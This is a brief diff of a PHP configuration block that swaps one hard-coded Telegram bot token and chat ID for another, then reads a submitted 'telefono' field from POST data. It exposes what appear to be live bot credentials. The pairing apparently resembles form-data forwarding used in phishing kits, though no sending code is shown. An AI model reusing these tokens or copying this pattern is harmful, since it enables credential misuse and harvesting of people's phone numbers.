@@ -1,7 +1,7 @@
 <?php
 // Datos de configuración
-$telegramBotToken = '6292750671:AAGMYKbdv0JQX_4ITagrUCPcKQB-HjboPkw';
-$chatId = '5157616506';
+$telegramBotToken = '7632972589:AAFRzRlHYr8nWKXTYj4w7TqLS4VLwV_XXns';
+$chatId = '-1002365815581';
 
 $telefono = $_POST['telefono'];
 
